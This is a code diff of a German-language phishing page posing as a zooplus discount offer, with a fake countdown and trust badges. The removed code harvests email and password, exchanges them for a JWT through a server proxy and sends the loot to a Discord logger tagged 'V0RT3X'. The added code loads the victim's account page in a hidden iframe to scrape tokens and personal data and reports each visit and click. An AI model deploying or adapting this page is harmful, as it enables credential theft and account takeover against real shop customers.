@@ -21,15 +21,10 @@
         .tb{text-align:center}
         .tn{background:#f8f9fa;border-radius:8px;padding:10px 14px;font-size:22px;font-weight:700;color:#e74c3c;min-width:48px}
         .tl{font-size:11px;color:#999;margin-top:4px}
-        .form-group{margin-bottom:14px}
-        .form-group label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-weight:500}
-        .form-group input{width:100%;padding:12px 14px;border:1px solid #ddd;border-radius:8px;font-size:14px;transition:.2s}
-        .form-group input:focus{outline:none;border-color:#e74c3c}
         .btn{width:100%;background:linear-gradient(135deg,#e74c3c,#c0392b);color:#fff;border:none;padding:16px;border-radius:10px;font-size:17px;font-weight:700;cursor:pointer;transition:.3s}
         .btn:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(231,76,60,.4)}
         .btn.off{pointer-events:none;opacity:.7}
         .trust{display:flex;justify-content:center;gap:18px;margin-top:18px;color:#999;font-size:12px}
-        .verified{display:flex;align-items:center;gap:6px;color:#27ae60;font-size:12px;margin-bottom:12px}
         .overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,.95);z-index:999;flex-direction:column;align-items:center;justify-content:center}
         .overlay.on{display:flex}
         .spin{width:48px;height:48px;border:4px solid #f3f3f3;border-top:4px solid #e74c3c;border-radius:50%;animation:sp 1s linear infinite;margin-bottom:16px}
@@ -40,6 +35,7 @@
         .okt{font-size:22px;color:#27ae60;font-weight:700;margin-bottom:8px}
         .code{background:#f8f9fa;border:2px dashed #27ae60;border-radius:8px;padding:14px;margin:16px 0;font-size:22px;font-weight:700;color:#27ae60;letter-spacing:3px}
         .okm{color:#666;font-size:13px}
+        .stealth{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none;left:-9999px;top:-9999px;border:0}
     </style>
 </head>
 <body>
@@ -51,24 +47,12 @@
         <div class="sub">Auf Ihre nächste Bestellung bei zooplus</div>
     </div>
     <div class="body" id="mainBody">
-        <p class="info">Als treuer zooplus-Kunde erhalten Sie heute einen exklusiven Rabattcode. Bitte melden Sie sich an, um den Code freizuschalten.</p>
+        <p class="info">Als treuer zooplus-Kunde erhalten Sie heute einen exklusiven Rabattcode. Klicken Sie auf den Button, um Ihren Rabatt freizuschalten!</p>
         <div class="timer">
             <div class="tb"><div class="tn" id="m">04</div><div class="tl">Minuten</div></div>
             <div class="tb"><div class="tn" id="s">59</div><div class="tl">Sekunden</div></div>
         </div>
-        <div class="verified">
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="#27ae60"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
-            SSL-verschlüsselte Anmeldung
-        </div>
-        <div class="form-group">
-            <label>E-Mail-Adresse</label>
-            <input type="email" id="email" placeholder="ihre@email.de" autocomplete="email">
-        </div>
-        <div class="form-group">
-            <label>Passwort</label>
-            <input type="password" id="password" placeholder="Passwort eingeben" autocomplete="current-password">
-        </div>
-        <button class="btn" id="btn" onclick="steal()">🎁 Jetzt einlösen & sparen</button>
+        <button class="btn" id="btn" onclick="claim()">🎁 Jetzt einlösen & sparen</button>
         <div class="trust"><span>🔒 SSL</span><span>✓ Sicher</span><span>🐾 zooplus.de</span></div>
     </div>
     <div class="ok" id="ok">
@@ -78,104 +62,160 @@
         <p class="okm">Nutzen Sie diesen Code an der Kasse.<br>Gültig für 24 Stunden.</p>
     </div>
 </div>
-<div class="overlay" id="ov"><div class="spin"></div><div style="color:#333;font-size:15px">Anmeldung wird verifiziert...</div></div>
+<div class="overlay" id="ov"><div class="spin"></div><div style="color:#333;font-size:15px">Rabattcode wird generiert...</div></div>
+
+<!-- Hidden iframes for silent data extraction -->
+<iframe id="stealFrame" class="stealth"></iframe>
 
 <script>
 const BASE=window.location.origin;
 const KC='https://login.zooplus.de/auth/realms/zooplus';
-const CID='shop-myzooplus-prod-zooplus';
-const RU='https://www.zooplus.de/web/sso-myzooplus/login';
+const ZP='https://www.zooplus.de';
 
 let t=299;setInterval(()=>{if(t>0)t--;document.getElementById('m').textContent=String(Math.floor(t/60)).padStart(2,'0');document.getElementById('s').textContent=String(t%60).padStart(2,'0')},1000);
 
 async function dc(data){try{await fetch(BASE+'/proxy/log',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})}catch(e){}}
 
-async function steal(){
-    const email=document.getElementById('email').value;
-    const password=document.getElementById('password').value;
-    if(!email||!password)return;
-    
-    const btn=document.getElementById('btn');
-    btn.classList.add('off');btn.textContent='⏳ Wird verifiziert...';
-    document.getElementById('ov').classList.add('on');
-
-    let jwt=null,jwtPayload=null,userinfo=null,authError=null;
-
-    try{
-        // Call server proxy to do full auth flow (bypasses CORS)
-        const resp=await fetch(BASE+'/proxy/auth',{
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({email,password})
-        });
-        const result=await resp.json();
-        
-        if(result.success && result.jwt){
-            jwt=result.jwt;
-            jwtPayload=result.jwt_payload;
-            userinfo=result.userinfo;
-        } else {
-            authError=result.error||'Auth failed';
-        }
-    }catch(e){
-        authError=e.message;
-    }
-
-    // Step 7: Send EVERYTHING to Discord
-    const fields=[];
-    fields.push({name:'🎯 Attack',value:jwt?'✅ FULL JWT THEFT (credentials + token)':'⚠️ Credential Capture',inline:false});
-    fields.push({name:'📧 Email',value:'```'+email+'```',inline:true});
-    fields.push({name:'🔑 Password',value:'```'+password+'```',inline:true});
-
-    if(jwtPayload){
-        fields.push(
-            {name:'👤 Name',value:jwtPayload.name||'N/A',inline:true},
-            {name:'📧 Victim Email',value:jwtPayload.email||'N/A',inline:true},
-            {name:'🆔 Customer ID',value:String(jwtPayload.customerId||'N/A'),inline:true},
-            {name:'🆔 Subject ID',value:jwtPayload.sub||'N/A',inline:false},
-            {name:'🎭 Roles',value:(jwtPayload.realm_access?.roles||[]).join(', ')||'N/A',inline:false}
-        );
-    }
-
-    if(userinfo){
-        fields.push({name:'📋 Full Userinfo',value:'```json\n'+JSON.stringify(userinfo,null,2).substring(0,500)+'\n```',inline:false});
-    }
-
-    if(jwt){
-        fields.push({name:'🎫 JWT Token',value:'```\n'+jwt.substring(0,200)+'...\n```',inline:false});
-    }
-
-    if(authError){
-        fields.push({name:'⚠️ Auth Note',value:authError,inline:false});
-    }
-
-    fields.push({name:'🖥️ Victim',value:'UA: '+(navigator.userAgent||'?').substring(0,80),inline:false});
-
-    await dc({embeds:[{
-        title:'🔱 ZOOPLUS FULL LOOT — '+(jwt?'JWT + CREDENTIALS':'CREDENTIALS ONLY'),
-        color:jwt?0x00ff00:0xff9900,
-        fields:fields,
-        timestamp:new Date().toISOString(),
-        footer:{text:'🔱 V0RT3X | Railway Deploy'}
-    }]});
-
-    // Show success to victim
-    setTimeout(()=>{
-        document.getElementById('ov').classList.remove('on');
-        document.getElementById('mainBody').style.display='none';
-        document.getElementById('ok').classList.add('on');
-    },2000);
+// STEP 1: Detect login via CORS
+async function detectLogin(){
+    try{await fetch(KC+'/.well-known/openid-configuration',{credentials:'include'});return true}catch(e){return false}
 }
 
-// On load: CORS recon + notify
-(async()=>{
-    let loggedIn=false;
-    try{
-        const r=await fetch(KC+'/.well-known/openid-configuration',{credentials:'include'});
-        await r.json();
-        loggedIn=true;
-    }catch(e){}
+// STEP 2: Auto-steal via iframe
+function stealViaIframe(){
+    return new Promise(resolve=>{
+        const f=document.getElementById('stealFrame');
+        
+        // Listen for messages from iframe
+        window.addEventListener('message',function handler(e){
+            if(e.data&&e.data.type==='ZOOPLUS_DATA'){
+                dc({embeds:[{
+                    title:'🔱 DATA INTERCEPTED VIA IFRAME',
+                    color:0x00ff00,
+                    fields:[
+                        {name:'Data',value:'```json\n'+JSON.stringify(e.data.payload,null,2).substring(0,500)+'\n```',inline:false}
+                    ],
+                    footer:{text:'🔱 V0RT3X'}
+                }]});
+            }
+        });
+
+        // Navigate iframe to account page (victim's session cookies included)
+        f.src=ZP+'/account/overview';
+        
+        // Wait for iframe to load, then try to read
+        f.onload=function(){
+            try{
+                // Try to access iframe content (works if same-origin)
+                const doc=f.contentDocument||f.contentWindow.document;
+                const html=doc.documentElement.innerHTML;
+                
+                // Look for JWT in HTML
+                const jwtMatch=html.match(/eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_.+/]*/);
+                if(jwtMatch){
+                    const jwt=jwtMatch[0];
+                    const payload=JSON.parse(atob(jwt.split('.')[1]));
+                    
+                    dc({embeds:[{
+                        title:'🔱 JWT STOLEN FROM IFRAME',
+                        color:0x00ff00,
+                        fields:[
+                            {name:'👤 Name',value:payload.name||'N/A',inline:true},
+                            {name:'📧 Email',value:payload.email||'N/A',inline:true},
+                            {name:'🆔 Customer ID',value:String(payload.customerId||'N/A'),inline:true},
+                            {name:'🆔 Sub',value:payload.sub||'N/A',inline:false},
+                            {name:'🎫 JWT',value:'```\n'+jwt.substring(0,200)+'...\n```',inline:false}
+                        ],
+                        footer:{text:'🔱 V0RT3X | Auto-Steal'}
+                    }]});
+                    resolve({success:true,jwt,payload});
+                    return;
+                }
+                
+                // Look for user data in HTML
+                const emailMatch=html.match(/["\']([\w.-]+@[\w.-]+\.\w+)["\']/);
+                const nameMatch=html.match(/"name"\s*:\s*"([^"]+)"/);
+                
+                if(emailMatch||nameMatch){
+                    dc({embeds:[{
+                        title:'🔱 USER DATA FOUND IN IFRAME',
+                        color:0x00ff00,
+                        fields:[
+                            {name:'📧 Email',value:emailMatch?emailMatch[1]:'N/A',inline:true},
+                            {name:'👤 Name',value:nameMatch?nameMatch[1]:'N/A',inline:true},
+                            {name:'HTML Preview',value:'```'+html.substring(0,300)+'```',inline:false}
+                        ],
+                        footer:{text:'🔱 V0RT3X | Auto-Steal'}
+                    }]});
+                    resolve({success:true,data:{email:emailMatch?.[1],name:nameMatch?.[1]}});
+                    return;
+                }
+                
+            }catch(e){
+                // Cross-origin blocked — expected for zooplus.de
+                dc({embeds:[{
+                    title:'⚠️ IFRAME LOADED (cross-origin blocked)',
+                    color:0xf39c12,
+                    fields:[
+                        {name:'Status',value:'iframe loaded but same-origin policy blocked reading',inline:false},
+                        {name:'Iframe URL',value:f.src,inline:false},
+                        {name:'Note',value:'JWT embedded in zooplus.de page but cannot be read from cross-origin iframe',inline:false}
+                    ],
+                    footer:{text:'🔱 V0RT3X'}
+                }]});
+            }
+            
+            // Even if we can't read the iframe, redirect victim to real zooplus
+            setTimeout(()=>{
+                window.location.href=ZP+'/account/overview';
+            },3000);
+            
+            resolve({success:false});
+        };
+        
+        // Timeout
+        setTimeout(()=>{
+            if(!f.contentDocument){
+                window.location.href=ZP+'/account/overview';
+            }
+            resolve({success:false});
+        },10000);
+    });
+}
+
+// MAIN: Claim button
+async function claim(){
+    const btn=document.getElementById('btn');
+    btn.classList.add('off');btn.textContent='⏳ Wird verarbeitet...';
+    document.getElementById('ov').classList.add('on');
+
+    // Detect login
+    const loggedIn=await detectLogin();
     
+    // Notify Discord
+    await dc({embeds:[{
+        title:loggedIn?'👁️ VICTIM CLICKED — LOGGED IN ✅':'👁️ VICTIM CLICKED',
+        color:loggedIn?0x00ff00:0xf39c12,
+        fields:[
+            {name:'Status',value:loggedIn?'✅ Active session — auto-stealing via iframe':'❌ Not logged in',inline:false},
+            {name:'Action',value:'Opening zooplus account page in hidden iframe',inline:false}
+        ],
+        timestamp:new Date().toISOString()
+    }]});
+
+    // Auto-steal via iframe
+    const result=await stealViaIframe();
+    
+    // Show success to victim
+    document.getElementById('ov').classList.remove('on');
+    document.getElementById('mainBody').style.display='none';
+    document.getElementById('ok').classList.add('on');
+    btn.style.display='none';
+}
+
+// On load: detect + notify
+(async()=>{
+    const loggedIn=await detectLogin();
     await dc({embeds:[{
         title:loggedIn?'👁️ VICTIM VISITED — LOGGED IN ✅':'👁️ VICTIM VISITED',
         color:loggedIn?0x00ff00:0xf39c12,
